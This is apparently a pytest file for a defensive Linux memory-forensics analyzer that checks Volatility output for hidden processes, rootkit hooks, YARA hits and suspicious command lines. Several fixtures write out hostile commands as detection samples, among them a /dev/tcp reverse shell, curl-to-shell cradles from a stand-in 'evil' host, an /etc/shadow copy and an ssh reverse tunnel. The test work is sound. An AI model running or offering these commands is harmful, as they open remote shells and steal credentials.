"""Offline Linux memory analyzer (analyze_memory_linux.py).

Volatility-3-Linux counterpart of Analyze-Memory.ps1. Pure analyzers over Vol JSON output;
schema-conformant findings; offline-dir path (pre-saved plugin JSON) tested without Vol.
"""
import datetime
import json
import os
import subprocess
import sys

from conftest import LINUX_HUNT

sys.path.insert(0, LINUX_HUNT)
import analyze_memory_linux as m       # noqa: E402

sys.path.insert(0, os.path.join(os.path.dirname(LINUX_HUNT), "..", "reporting"))
import finding_schema                  # noqa: E402


def types(f):
    return {x["Type"] for x in f}


def test_hidden_process_detection():
    pslist = [{"PID": 1, "COMM": "systemd"}, {"PID": 100, "COMM": "sshd"}]
    pidhash = pslist + [{"PID": 1337, "COMM": "evil"}]
    f = m.analyze_processes(pslist, pidhash)
    assert "Hidden Process (memory)" in types(f) and "1337" in f[0]["Target"]


def test_no_hidden_when_consistent():
    rows = [{"PID": 1, "COMM": "systemd"}]
    assert m.analyze_processes(rows, rows) == []


def test_malfind_injected():
    f = m.analyze_malfind([{"PID": 4242, "Process": "nginx", "Protection": "rwx",
                            "Start": "0x7f00"}])
    assert "Injected Memory (malfind)" in types(f) and "T1055" in f[0]["MITRE"]


def test_cmdline_reverse_shell_and_offensive_and_implant():
    f = m.analyze_cmdlines([
        {"PID": 1, "ARGS": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
        {"PID": 2, "ARGS": "/opt/mimikatz/mimikatz"},
        {"PID": 3, "ARGS": "/tmp/.x/beacon"},
        {"PID": 4, "ARGS": "/usr/sbin/nginx"}])
    assert "Reverse Shell (memory)" in types(f)
    assert "Offensive Tooling (memory)" in types(f)
    assert "Implant-Path Execution (memory)" in types(f)
    assert len(f) == 3            # nginx clean


def test_implant_exec_matches_executable_not_data_arg():
    # implant dir as the EXECUTABLE (argv[0]) or interpreter's SCRIPT (argv[1]) -> flagged;
    # implant dir only as a data ARGUMENT (firefox crashhelper scratch dir) -> NOT flagged.
    f = m.analyze_cmdlines([
        {"PID": 1, "ARGS": "/tmp/.x/beacon --connect"},                 # exe in /tmp
        {"PID": 2, "ARGS": "python3 /dev/shm/payload.py"},              # interpreted implant
        {"PID": 3, "ARGS": "/usr/lib/firefox/crashhelper 166405 9 /tmp/ 11"},  # FP: /tmp/ is a data arg
        {"PID": 4, "ARGS": "tar -C /tmp/build -czf out.tgz ."}])        # FP: /tmp/build is a data arg
    tg = {x["Target"] for x in f if x["Type"] == "Implant-Path Execution (memory)"}
    assert tg == {"PID 1", "PID 2"}            # only the real executables, not the data args


def test_lotl_cmdlines_detect_techniques():
    f = m.analyze_cmdlines([
        {"PID": 10, "ARGS": "echo aGVsbG8= | base64 -d | bash"},        # encoded exec
        {"PID": 11, "ARGS": "curl http://evil/x | sh"},                  # download cradle
        {"PID": 12, "ARGS": "find / -perm -4000 -exec /bin/sh ;"},      # GTFOBins escape
        {"PID": 13, "ARGS": "cp /etc/shadow /tmp/s"},                    # credential access
        {"PID": 14, "ARGS": "ssh -R 9000:localhost:22 attacker@1.2.3.4"},  # reverse tunnel
        {"PID": 15, "ARGS": "history -c"},                              # anti-forensics
        {"PID": 16, "ARGS": "/usr/sbin/nginx -g daemon off;"}])          # clean
    t = types(f)
    assert "Encoded Execution (memory)" in t
    assert "Download Cradle (memory)" in t
    assert "Shell Escape / GTFOBins (memory)" in t
    assert "Credential Access (memory)" in t
    assert "Tunneling / C2 (memory)" in t
    assert "Defense Evasion / Anti-Forensics (memory)" in t
    assert not any(x["Target"] == "PID 16" for x in f)        # nginx clean


def test_ssh_agent_is_not_tunneling():
    # ssh-agent -D is the agent daemon, NOT an ssh tunnel — must not be flagged (absolute FP).
    f = m.analyze_cmdlines([{"PID": 1, "ARGS": "/usr/bin/ssh-agent -D"},
                            {"PID": 2, "ARGS": "ssh-add -l"}])
    assert not any(x["Type"] == "Tunneling / C2 (memory)" for x in f)
    # but a real ssh dynamic/reverse tunnel still fires
    g = m.analyze_cmdlines([{"PID": 3, "ARGS": "ssh -D 1080 user@host"}])
    assert any(x["Type"] == "Tunneling / C2 (memory)" for x in g)


def test_phase1_plugins():
    assert "Linker Hijack (memory)" in types(
        m.analyze_envars([{"PID": 5, "COMM": "x", "KEY": "LD_PRELOAD", "VALUE": "/tmp/evil.so"}]))
    assert "Ptrace Attachment (memory)" in types(
        m.analyze_ptrace([{"PID": 7, "Process": "x", "Tracer TID": "1337"}]))
    assert m.analyze_ptrace([{"PID": 8, "Tracer TID": "0"}]) == []      # not traced
    assert "Hidden Kernel Module (carved)" in types(
        m.analyze_hidden_modules([{"Name": "rk", "Address": "0xffff"}]))      # named -> High
    f = m.analyze_hidden_modules([{"Name": "", "Address": "0xdead"}])         # unnamed -> Medium verify
    assert f and f[0]["Type"] == "Unnamed Carved Module (verify)" and f[0]["Severity"] == "Medium"


def test_precision_gating_from_live_validation():
    # memfd-backed EXECUTABLE mapping is the precise fileless signal (not every open memfd FD).
    assert "Implant-Backed Mapping (memory)" in types(
        m.analyze_maps([{"PID": 1, "Process": "x", "Flags": "r-x", "File Path": "/memfd:run (deleted)"}]))
    # netfilter: legitimate (Is Hooked=False) hooks are NOT flagged; only Is Hooked=True.
    assert m.analyze_netfilter([{"Hook": "PRE_ROUTING", "Module": "nf_conntrack", "Is Hooked": False}]) == []
    assert "Netfilter Hook (memory)" in types(
        m.analyze_netfilter([{"Hook": "LOCAL_OUT", "Module": "evil", "Is Hooked": True}]))
    # kthread backed by a real module (dm_crypt/nvidia) is NOT a hijack; no-module unresolved is.
    assert m.analyze_kthreads([{"TID": 1, "Thread Name": "nv_queue", "Symbol": "UNKNOWN",
                                "Module": "nvidia"}]) == []
    assert "Kernel Thread Hook (memory)" in types(
        m.analyze_kthreads([{"TID": 2, "Thread Name": "x", "Symbol": "UNKNOWN", "Module": ""}]))
    # capabilities: root holding caps carries no signal; only a non-root holder is flagged.
    assert m.analyze_capabilities([{"Name": "systemd", "Pid": 1, "EUID": "0",
                                    "cap_effective": "sys_admin,sys_ptrace"}]) == []
    # tmpfs on a normal mount point is NOT flagged (it's the standard layout).
    assert m.analyze_mountinfo([{"MOUNT_POINT": "/dev/shm", "FSTYPE": "tmpfs"}]) == []


def test_phase2_plugins():
    assert "eBPF Program (memory)" in types(
        m.analyze_ebpf([{"Name": "p", "Type": "socket_filter", "Tag": "abc"}]))   # ALL types
    assert "Kernel Thread Hook (memory)" in types(
        m.analyze_kthreads([{"TID": 9, "Thread Name": "kx", "Symbol": "UNKNOWN"}]))
    assert m.analyze_kthreads([{"TID": 9, "Symbol": "worker_thread"}]) == []      # resolved=clean
    assert "Keyboard Notifier Hook (keylogger)" in types(
        m.analyze_keyboard_notifiers([{"Address": "0x1", "Symbol": "UNKNOWN"}]))


def test_phase3_plugins():
    assert "Dangerous Capability (memory)" in types(
        m.analyze_capabilities([{"Name": "x", "Pid": 10, "EUID": "1000",
                                 "cap_effective": "sys_admin,net_raw"}]))
    assert "Suspicious Loaded Library (memory)" in types(
        m.analyze_library_list([{"Pid": 11, "Path": "/dev/shm/inject.so"}]))
    assert "Bind Mount Over System Path (memory)" in types(
        m.analyze_mountinfo([{"MOUNT_POINT": "/etc/passwd", "MOUNT_OPTIONS": "bind,ro"}]))
    assert "Implant-Backed Mapping (memory)" in types(
        m.analyze_maps([{"PID": 12, "Process": "x", "Flags": "r-x", "File Path": "/tmp/.x/m"}]))


def test_lotl_feeds_correlation():
    # a LOTL technique (strong) + external connection on one PID -> correlated threat
    base = m.analyze_cmdlines([{"PID": 4242, "ARGS": "curl http://evil/x | sh"}])
    base += m.analyze_sockstat([{"PID": 4242, "Process": "sh", "Destination Addr": "9.9.9.9",
                                 "Destination Port": 443, "State": "ESTABLISHED"}])
    assert any(x["Type"] == "Correlated Memory Threat" and "4242" in x["Target"]
               for x in m.correlate(base))


def test_bash_history():
    f = m.analyze_bash([{"PID": 9, "Command": "curl http://evil/x | bash", "CommandTime": "t"},
                        {"PID": 9, "Command": "ls -la"}])
    assert "Suspicious Shell History (memory)" in types(f) and len(f) == 1


def test_external_connection_attribution_not_reputation():
    # (B done right) PID->comm join is ATTRIBUTION only. Severity is NOT downgraded by process
    # name — a browser beaconing (injected) is a real C2 vector, so all external conns stay Medium.
    proc_map = {"100": "firefox"}
    f = m.analyze_sockstat([
        {"PID": 100, "Destination Addr": "140.82.112.3", "Destination Port": 443,
         "State": "ESTABLISHED"},                                  # comm missing -> joined
        {"PID": 200, "Process": "kworker-x", "Destination Addr": "45.66.77.88",
         "Destination Port": 443, "State": "ESTABLISHED"}], proc_map)
    assert all(x["Severity"] == "Medium" for x in f)               # no name-based downgrade
    assert any("firefox" in x["Details"] for x in f)               # attribution filled from pslist


def test_correlate_escalates_on_convergence():
    # (A) hidden proc (strong) + external conn on the SAME pid -> Correlated Memory Threat.
    findings = [
        m._finding("High", "Hidden Process (memory)", "PID 1337 (x)", "d", "M"),
        m._finding("Medium", "External Connection (memory)", "5.5.5.5:443",
                   "PID 1337 ('x') had an external connection to 5.5.5.5:443", "M"),
    ]
    c = m.correlate(findings)
    assert len(c) == 1 and c[0]["Type"] == "Correlated Memory Threat"
    assert "1337" in c[0]["Target"] and c[0]["Severity"] == "High"


def test_correlate_no_false_escalation_on_jit_plus_network():
    # A browser PID has BOTH anon-exec memory (JIT) and external connections — both weak signals.
    # Without a strong signal this must NOT escalate (the key FP guard).
    findings = [
        m._finding("High", "Injected Memory (malfind)", "PID 3767 (gnome-shell)", "d", "M"),
        m._finding("Low", "External Connection (memory)", "1.2.3.4:443",
                   "PID 3767 ('gnome-shell') had an external connection", "M"),
    ]
    assert m.correlate(findings) == []


def test_analyzer_dedups_identical_findings():
    # a process with many sockets to the SAME ip:port collapses to one External Connection fact.
    rows = {"linux.sockstat.Sockstat": [
        {"PID": 9, "Process": "x", "Destination Addr": "8.8.8.8", "Destination Port": 443,
         "State": "ESTABLISHED"} for _ in range(20)]}
    f = m.analyze(rows)
    ext = [x for x in f if x["Type"] == "External Connection (memory)"]
    assert len(ext) == 1                               # 20 identical -> 1


def test_merge_findings_is_idempotent():
    sys.path.insert(0, os.path.join(os.path.dirname(LINUX_HUNT), "..", "reporting"))
    import merge_findings as mf
    a = [{"Timestamp": "t1", "Type": "X", "Target": "p", "Details": "d", "Severity": "High",
          "MITRE": "M"}]
    b = [{"Timestamp": "t2", "Type": "X", "Target": "p", "Details": "d", "Severity": "High",
          "MITRE": "M"}]                                # same content, different timestamp
    assert len(mf.merge(a, b)) == 1                     # not double-counted
    assert len(mf.merge(mf.merge(a, b), b)) == 1        # re-merging stays stable


def test_prioritize_orders_correlated_and_severity_first():
    fs = [
        m._finding("Low", "External Connection (memory)", "1.1.1.1:443", "d", "M"),
        m._finding("High", "Correlated Memory Threat", "PID 9 (x)", "d", "M"),
        m._finding("Medium", "External Connection (memory)", "2.2.2.2:443", "d", "M"),
    ]
    ordered = m.prioritize(fs)
    assert ordered[0]["Type"] == "Correlated Memory Threat"
    assert [x["Severity"] for x in ordered] == ["High", "Medium", "Low"]


def test_sockstat_external_only():
    f = m.analyze_sockstat([
        {"Process": "beacon", "Destination Addr": "45.66.77.88", "Destination Port": 443,
         "State": "ESTABLISHED"},
        {"Process": "app", "Destination Addr": "10.0.0.9", "Destination Port": 5432,
         "State": "ESTABLISHED"}])
    assert "External Connection (memory)" in types(f) and len(f) == 1
    assert "45.66.77.88" in f[0]["Target"]


def test_rootkit_checks():
    assert "Syscall Table Hook" in types(
        m.analyze_check_syscall([{"Index": 2, "Symbol": "UNKNOWN"}]))
    assert "Hidden Kernel Module (memory)" in types(
        m.analyze_check_modules([{"Name": "hideme"}]))
    assert "TTY Hook" in types(m.analyze_tty([{"Name": "ptm0", "Symbol": "HOOKED"}]))


def test_hidden_module_skips_empty_names():
    # empty/blank module names are check_modules noise, not a rootkit -> suppressed;
    # a named hidden module still fires (no blindspot for real rootkits).
    f = m.analyze_check_modules([{"Name": ""}, {"Name": "  "}, {"Name": "-"},
                                 {"Name": "evil_rk"}])
    assert len(f) == 1 and f[0]["Target"] == "evil_rk"


def test_syscall_clean_when_attributed():
    assert m.analyze_check_syscall([{"Index": 2, "Symbol": "sys_read"}]) == []


def test_findings_conform_to_schema():
    rows = {
        "linux.pslist.PsList": [{"PID": 1, "COMM": "systemd"}],
        "linux.pidhashtable.PIDHashTable": [{"PID": 1, "COMM": "systemd"},
                                            {"PID": 666, "COMM": "x"}],
        "linux.malfind.Malfind": [{"PID": 2, "Process": "p", "Protection": "rwx"}],
        "linux.sockstat.Sockstat": [{"Destination Addr": "8.8.8.8", "Destination Port": 53,
                                     "State": "ESTABLISHED"}],
    }
    findings = m.analyze(rows)
    assert findings and finding_schema.validate(findings, adjudicated=False) == []


# ── CLI (offline-dir) ────────────────────────────────────────────────────────
def test_cli_offline_dir(tmp_path):
    off = tmp_path / "vol"
    off.mkdir()
    (off / "linux.malfind.Malfind.json").write_text(json.dumps(
        [{"PID": 7, "Process": "evil", "Protection": "rwx", "Start": "0x10"}]))
    (off / "linux.check_modules.Check_modules.json").write_text(json.dumps(
        [{"Name": "rootkit_mod"}]))
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    r = subprocess.run(
        [sys.executable, os.path.join(LINUX_HUNT, "analyze_memory_linux.py"),
         "--offline-dir", str(off), "--output-dir", str(tmp_path), "--stamp", stamp, "--quiet"],
        capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    data = json.loads((tmp_path / f"Memory_Findings_{stamp}.json").read_text())
    assert any(x["Type"] == "Injected Memory (malfind)" for x in data)
    assert any(x["Type"] == "Hidden Kernel Module (memory)" for x in data)


def test_yara_match_and_noise_suppression():
    f = m.analyze_yara([
        {"Rule": "Linux_Trojan_Gafgyt", "PID": 1337, "Process": "x", "Offset": "0x1"},
        {"Rule": "base64_generic", "Offset": "0x2"}])     # noise -> suppressed
    assert "YARA Memory Match" in types(f) and len(f) == 1
    assert "Gafgyt" in f[0]["Target"]


def test_compile_yara_passes_through_compiled(tmp_path):
    # an analyst-supplied already-compiled ruleset is used as-is (returns the path + 0/0 counts)
    yarc = str(tmp_path / "r.yarc")
    assert m.compile_yara_ruleset(yarc, None, False, str(tmp_path), "s") == (yarc, 0, 0)


def test_compile_yara_none_when_no_rules(tmp_path):
    # empty dir / no rules -> (None, 0, 0), no crash (graceful when yara-python absent too)
    assert m.compile_yara_ruleset(None, str(tmp_path), False, str(tmp_path), "s") == (None, 0, 0)


def test_yara_canary_suppressed_and_trusted():
    # the self-test canary is never reported as a threat; its presence = engine inspected memory
    rows = [{"Rule": "IRToolkit_Canary_ELF", "Offset": "0x1"},
            {"Rule": "Cobalt_Strike_Beacon", "Process": "x", "Offset": "0x2"}]
    f = m.analyze_yara(rows)
    assert [x for x in f] and all("Canary" not in x["Target"] for x in f)
    assert any("Cobalt" in x["Target"] for x in f)
    assert m._canary_hits(rows) == 1


# ── YARA severity attribution gate (a full-image scan has no PID/region context; an
# alarming rule NAME alone must never reach Critical without it) ────────────────────
def test_unattributed_high_signal_rule_capped_at_medium():
    """The actual bug: RANSOM_/Backdoor_/Implant_-named rules matching nothing more
    specific than a generic string (a bare shebang, a common path) anywhere in a
    multi-GB raw image were reaching Critical purely from the rule name. No PID, no
    region/perms -> capped at Medium regardless of the name."""
    f = m.analyze_yara([{"Rule": "RANSOM_ESXiArgs_Ransomware_Bash_Feb23", "Offset": "0x1"}])
    assert len(f) == 1
    assert f[0]["Severity"] == "Medium"
    assert "UNATTRIBUTED" in f[0]["Details"]


def test_attributed_high_signal_rule_reaches_critical():
    """The same rule name, but attributed to a live process (PID present, even
    without anon-exec region context) -- real evidence, allowed to reach Critical."""
    f = m.analyze_yara([{"Rule": "RANSOM_ESXiArgs_Ransomware_Bash_Feb23", "PID": 4242,
                         "Process": "x", "Offset": "0x1"}])
    assert len(f) == 1
    assert f[0]["Severity"] == "Critical"
    assert "UNATTRIBUTED" not in f[0]["Details"]


def test_attributed_non_high_signal_rule_is_high():
    f = m.analyze_yara([{"Rule": "Linux_Trojan_Gafgyt", "PID": 1337, "Process": "x",
                         "Offset": "0x1"}])
    assert f[0]["Severity"] == "High"


def test_unattributed_non_high_signal_rule_is_medium_not_high():
    """Previously EVERY non-anon-exec, non-high-signal hit defaulted to High regardless
    of attribution -- an unattributed offset-only hit with an unremarkable rule name is
    the weakest possible evidence class and must not outrank a properly-attributed one."""
    f = m.analyze_yara([{"Rule": "Linux_Trojan_Gafgyt", "Offset": "0x1"}])
    assert f[0]["Severity"] == "Medium"


def test_anon_exec_always_critical_regardless_of_attribution_or_name():
    f = m.analyze_yara([{"Rule": "some_boring_rule", "PID": 1, "Process": "x",
                         "Region": "anon", "Perms": "rwx", "Offset": "0x1"}])
    assert f[0]["Severity"] == "Critical"
    assert f[0]["Type"] == "Injected Code (memory YARA)"


def test_file_backed_attributed_hit_keeps_context_note():
    f = m.analyze_yara([{"Rule": "Linux_Trojan_Gafgyt", "PID": 1, "Process": "x",
                         "Region": "file", "Perms": "r-x", "Path": "/usr/lib/libfoo.so",
                         "Offset": "0x1"}])
    assert f[0]["Severity"] == "High"
    assert "libfoo.so" in f[0]["Details"]
    assert "UNATTRIBUTED" not in f[0]["Details"]


# ── _merge_yara_rows: native full-image rows + per-process follow-up attribution ────
def test_merge_replaces_attributed_rule_with_enriched_version():
    native = [{"Rule": "Cobalt_Strike_Beacon", "Offset": "0x1", "Value": "aabb"}]
    enriched = [{"Rule": "Cobalt_Strike_Beacon", "PID": 99, "Process": "x",
                "Region": "anon", "Perms": "rwx", "Offset": "0x1"}]
    merged = m._merge_yara_rows(native, enriched)
    assert len(merged) == 1                      # not duplicated
    assert merged[0].get("PID") == 99             # the richer, attributed version won


def test_merge_keeps_unattributed_rule_not_dropped():
    """The core regression this fix targets: a rule that never reproduced against any
    live process must still surface (analyze_yara() caps its severity), not vanish."""
    native = [{"Rule": "Cobalt_Strike_Beacon", "Offset": "0x1"},
             {"Rule": "RANSOM_ESXiArgs_Ransomware_Bash_Feb23", "Offset": "0x2"}]
    enriched = [{"Rule": "Cobalt_Strike_Beacon", "PID": 99, "Process": "x",
                "Region": "anon", "Perms": "rwx", "Offset": "0x1"}]
    merged = m._merge_yara_rows(native, enriched)
    rules = {r.get("Rule") for r in merged}
    assert rules == {"Cobalt_Strike_Beacon", "RANSOM_ESXiArgs_Ransomware_Bash_Feb23"}


def test_merge_with_zero_attributed_hits_keeps_every_native_row():
    """The exact real-world scenario that motivated this fix: the per-process
    follow-up ran and attributed NOTHING (every native hit was full-image noise).
    Previously this left `rows["yarascan.YaraScan"]` as the raw, unfiltered native
    set with no attribution gate applied anywhere downstream."""
    native = [{"Rule": f"rule_{i}", "Offset": hex(i)} for i in range(50)]
    merged = m._merge_yara_rows(native, [])
    assert len(merged) == 50


def test_merge_excludes_canary_and_blank_rule_names_from_carryover():
    native = [{"Rule": "IRToolkit_Canary_ELF", "Offset": "0x1"},
             {"Rule": "", "Offset": "0x2"},
             {"Rule": "real_rule", "Offset": "0x3"}]
    merged = m._merge_yara_rows(native, [])
    assert {r.get("Rule") for r in merged} == {"real_rule"}


def test_merge_handles_empty_native_and_empty_enriched():
    assert m._merge_yara_rows([], []) == []
    assert m._merge_yara_rows(None, None) == []


# ── End-to-end: merge -> analyze_yara, the real pipeline shape ──────────────────────
def test_zero_attribution_run_surfaces_findings_capped_at_medium_not_critical():
    """Full flow for a clean host where nothing reproduces per-process: every hit
    still becomes a finding (nothing silently dropped), but a RANSOM_/Backdoor_/
    Implant_-named rule can no longer reach Critical purely from its own name."""
    native = [
        {"Rule": "RANSOM_ESXiArgs_Ransomware_Bash_Feb23", "Offset": "0x1", "Value": "23212f"},
        {"Rule": "ELF_Implant_COATHANGER_Feb2024", "Offset": "0x2", "Value": "2f657463"},
        {"Rule": "IRToolkit_Canary_ELF", "Offset": "0x3"},
    ]
    merged = m._merge_yara_rows(native, [])
    findings = m.analyze_yara(merged)
    assert len(findings) == 2                     # canary excluded, nothing else dropped
    assert all(f["Severity"] == "Medium" for f in findings)
    assert not any(f["Severity"] == "Critical" for f in findings)


def test_partial_attribution_run_mixes_severities_correctly():
    native = [
        {"Rule": "RANSOM_ESXiArgs_Ransomware_Bash_Feb23", "Offset": "0x1"},   # noise, never attributes
        {"Rule": "Cobalt_Strike_Beacon", "Offset": "0x2"},                    # DOES attribute below
    ]
    enriched = [{"Rule": "Cobalt_Strike_Beacon", "PID": 4242, "Process": "evil",
                "Region": "anon", "Perms": "rwx", "Offset": "0x2"}]
    findings = m.analyze_yara(m._merge_yara_rows(native, enriched))
    sev = {f["Severity"] for f in findings}
    assert sev == {"Medium", "Critical"}
    critical = next(f for f in findings if f["Severity"] == "Critical")
    assert "4242" in critical["Target"]


# ── YARA scan coverage gap: a per-process scan that hit its time/byte budget stopped
# early -- "0 hits in the part checked" must not look identical to "fully scanned, clean" ──
def test_capped_pids_with_names_resolves_from_finished():
    parsed = {
        "finished": [("100", "gnome-shell", []), ("200", "firefox-bin", [{"rule": "x"}])],
        "timeouts": ["100", "200"],
    }
    assert m._capped_pids_with_names(parsed) == [("100", "gnome-shell"), ("200", "firefox-bin")]


def test_capped_pids_with_names_unknown_pid_falls_back_to_placeholder():
    parsed = {"finished": [], "timeouts": ["999"]}
    assert m._capped_pids_with_names(parsed) == [("999", "?")]


def test_capped_pids_with_names_empty_when_nothing_timed_out():
    parsed = {"finished": [("100", "sshd", [])], "timeouts": []}
    assert m._capped_pids_with_names(parsed) == []


def test_analyze_yara_coverage_emits_medium_finding_per_capped_pid():
    findings = m.analyze_yara_coverage([("100", "gnome-shell"), ("200", "firefox-bin")])
    assert len(findings) == 2
    assert all(f["Type"] == "YARA Scan Coverage Incomplete (memory)" for f in findings)
    assert all(f["Severity"] == "Medium" for f in findings)
    assert "PID: 100 (gnome-shell)" == findings[0]["Target"]
    assert "incomplete" in findings[0]["Details"].lower() or "budget" in findings[0]["Details"].lower()


def test_analyze_yara_coverage_empty_or_none_input_yields_no_findings():
    assert m.analyze_yara_coverage([]) == []
    assert m.analyze_yara_coverage(None) == []


def test_capped_process_with_zero_hits_still_surfaces_a_finding():
    """The actual bug: a process that timed out with 0 rule hits in the portion checked must
    NOT be indistinguishable from a fully-scanned clean process -- it needs its own finding.
    This process contributes no rows to analyze_yara() at all (no rule ever matched it), so
    analyze_yara_coverage() is the ONLY thing that can surface the "incomplete" fact."""
    parsed = {"finished": [("3775", "gnome-shell", [])], "timeouts": ["3775"]}
    yara_findings = m.analyze_yara([])                 # no rule matched -> nothing to report here
    coverage_findings = m.analyze_yara_coverage(m._capped_pids_with_names(parsed))
    assert yara_findings == []
    assert len(coverage_findings) == 1                 # but the incomplete-coverage fact IS surfaced
    assert "3775" in coverage_findings[0]["Target"]


def test_decompress_passthrough_for_plain_image():
    assert m.decompress_if_needed("mem.raw") == "mem.raw"
    assert m.decompress_if_needed("mem.lime") == "mem.lime"


def test_decompress_compressed_without_tool_raises(monkeypatch):
    monkeypatch.setattr(m.shutil, "which", lambda _: None)    # avml-convert not on PATH
    monkeypatch.setattr(m.os, "access", lambda *_a, **_k: False)  # and no staged tools/avml-convert
    try:
        m.decompress_if_needed("memory_host.lime.compressed")
        assert False, "expected RuntimeError"
    except RuntimeError as e:
        assert "avml-convert" in str(e)


def test_cli_offline_yarascan(tmp_path):
    off = tmp_path / "vol"
    off.mkdir()
    (off / "yarascan.YaraScan.json").write_text(json.dumps(
        [{"Rule": "Cobalt_Strike_Beacon", "Offset": "0xdead", "Process": "evil"}]))
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    r = subprocess.run(
        [sys.executable, os.path.join(LINUX_HUNT, "analyze_memory_linux.py"),
         "--offline-dir", str(off), "--output-dir", str(tmp_path), "--stamp", stamp, "--quiet"],
        capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    data = json.loads((tmp_path / f"Memory_Findings_{stamp}.json").read_text())
    assert any(x["Type"] == "YARA Memory Match" and "Cobalt_Strike" in x["Target"] for x in data)


def test_cli_refuses_invalid_image(tmp_path):
    bad = tmp_path / "INVALID_memory_host.raw"
    bad.write_bytes(b"x")
    r = subprocess.run(
        [sys.executable, os.path.join(LINUX_HUNT, "analyze_memory_linux.py"),
         "--image", str(bad), "--output-dir", str(tmp_path)],
        capture_output=True, text=True)
    assert r.returncode == 1 and "INVALID_" in r.stderr
